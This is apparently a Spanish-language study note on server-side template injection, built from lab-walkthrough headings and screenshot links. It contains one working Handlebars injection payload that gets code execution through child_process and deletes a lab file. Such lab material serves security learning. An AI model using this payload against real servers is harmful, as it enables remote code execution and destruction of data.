
**Server-Side Template Injection (SSTI)** es una vulnerabilidad que ocurre cuando un atacante es capaz de inyectar y ejecutar código malicioso en el servidor a través de una plantilla de renderización. Las plantillas en el servidor son utilizadas para generar dinámicamente contenido HTML, y esta vulnerabilidad surge cuando se permite que las entradas del usuario se incluyan sin una validación o escape adecuado dentro de las plantillas.

# Inyección básica de plantillas del lado del servidor

![[01.InyeccionBasicaPlantillas.png]]
![[02.InyeccionBasicaPlantillas.png]]
![[03.InyeccionBasicaPlantillas.png]]
![[04.InyeccionBasicaPlantillas.png]]
![[05.InyeccionBasicaPlantillas.png]]
![[06.InyeccionBasicaPlantillas.png]]
![[07.InyeccionBasicaPlantillas.png]]
![[08.InyeccionBasicaPlantillas.png]]
![[09.InyeccionBasicaPlantillas.png]]
![[10.InyeccionBasicaPlantillas.png]]
![[11.InyeccionBasicaPlantillas.png]]
![[12.InyeccionBasicaPlantillas.png]]
![[13.InyeccionBasicaPlantillas.png]]

# Inyección básica de plantillas del lado del servidor (contexto del código)

![[01.ContextoDelCodigo.png]]
![[02.ContextoDelCodigo.png]]
![[03.ContextoDelCodigo.png]]
![[04.ContextoDelCodigo.png]]
![[05.ContextoDelCodigo.png]]
![[06.ContextoDelCodigo.png]]
![[07.ContextoDelCodigo.png]]
![[08.ContextoDelCodigo.png]]
![[09.ContextoDelCodigo.png]]
![[10.ContextoDelCodigo.png]]
![[11.ContextoDelCodigo.png]]

# Inyección de plantillas del lado del servidor mediante documentación

![[01.DocumentacionMedianteServidor.png]]
![[02.DocumentacionMedianteServidor.png]]
![[03.DocumentacionMedianteServidor.png]]
![[04.DocumentacionMedianteServidor.png]]
![[05.DocumentacionMedianteServidor.png]]
![[06.DocumentacionMedianteServidor.png]]
![[07.DocumentacionMedianteServidor.png]]
![[08.DocumentacionMedianteServidor.png]]
![[09.DocumentacionMedianteServidor.png]]


# Inyección de plantilla del lado del servidor en un lenguaje desconocido con un exploit documentado

![[01.InyeccionDePlantillaExploit.png]]
![[02.InyeccionDePlantillaExploit.png]]
![[03.InyeccionDePlantillaExploit.png]]
```
wrtz{{#with "s" as |string|}}
    {{#with "e"}}
        {{#with split as |conslist|}}
            {{this.pop}}
            {{this.push (lookup string.sub "constructor")}}
            {{this.pop}}
            {{#with string.split as |codelist|}}
                {{this.pop}}
                {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
                {{this.pop}}
                {{#each conslist}}
                    {{#with (string.sub.apply 0 codelist)}}
                        {{this}}
                    {{/with}}
                {{/each}}
            {{/with}}
        {{/with}}
    {{/with}}
{{/with}}
```

Decode URL
![[04.InyeccionDePlantillaExploit.png]]
![[05.InyeccionDePlantillaExploit.png]]

# Inyección de plantillas del lado del servidor con divulgación de información a través de objetos proporcionados por el usuario

![[01.ObjetosProporcionadosPorUsuario.png]]
![[02.ObjetosProporcionadosPorUsuario.png]]
![[03.ObjetosProporcionadosPorUsuario.png]]
![[04.ObjetosProporcionadosPorUsuario.png]]
![[05.ObjetosProporcionadosPorUsuario.png]]

https://docs.djangoproject.com/en/5.0/ref/settings/

![[06.ObjetosProporcionadosPorUsuario.png]]
![[07.ObjetosProporcionadosPorUsuario.png]]
![[08.ObjetosProporcionadosPorUsuario.png]]
